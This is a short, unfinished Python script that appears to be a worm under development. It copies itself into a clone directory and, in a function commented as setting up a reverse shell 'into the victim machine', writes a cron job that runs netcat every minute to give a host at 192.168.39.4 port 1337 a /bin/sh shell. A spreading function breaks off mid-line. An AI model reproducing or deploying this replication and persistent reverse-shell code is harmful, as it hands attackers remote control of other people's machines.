#!/usr/bin/env python3

from sys import argv
import os
import shutil

def cloning():
#replication
	script = argv
	name = str(script[0])

#for if the clone dir already exists

	if os.path.exists('clone'):
		os.system(r'rm -r clone')

	#replication 
	os.mkdir('clone')
	os.system(r"cp " + name + " clone")



#need some way to establish persistence on the victim

#sets up a cron job to create a reverse shell into the victim machine
def shell():
	os.system(r'echo "* * * * * nc 192.168.39.4 1337 -e /bin/sh" > cron')
	os.system(r'crontab -i cron')
	os.system(r'rm cron')

#need a way to spread throughout the system and create more persistence

def bootspreading():
	os.system(r'echo "30 16 * * * ')